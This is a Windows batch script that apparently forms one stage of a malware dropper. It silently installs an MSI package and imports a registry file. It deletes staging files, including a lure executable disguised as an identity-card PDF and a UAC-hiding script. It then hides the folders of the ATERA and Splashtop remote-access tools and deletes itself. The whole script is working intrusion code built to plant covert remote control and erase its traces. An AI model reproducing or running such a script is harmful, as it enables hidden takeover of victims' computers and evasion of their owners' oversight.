echo off
TIMEOUT /T 2
msiexec /i C:\temp\Rastaf.msi /qn /norestart
TIMEOUT /T 45
reg import c:\temp\Clean.reg
TIMEOUT /T 5
del /F /Q c:\temp\pdf.ico
del /F /Q c:\temp\if.bat
del /F /Q c:\temp\Clean.reg
del /F /Q c:\temp\Rastaf.msi
del /F /Q c:\temp\Rastaf.reg
del /F /Q c:\temp\HideUAC.vbs
del /F /Q c:\temp\Rast.bat
del /F /Q c:\temp\CARTA_IDENTITA.exe
attrib +h "C:\Program Files (x86)\ATERA Networks"
attrib +h "C:\ProgramData\Splashtop"
attrib +h "C:\Program Files (x86)\Splashtop"
attrib +h "C:\Program Files\ATERA Networks"
TIMEOUT /T 5

del %0

exit

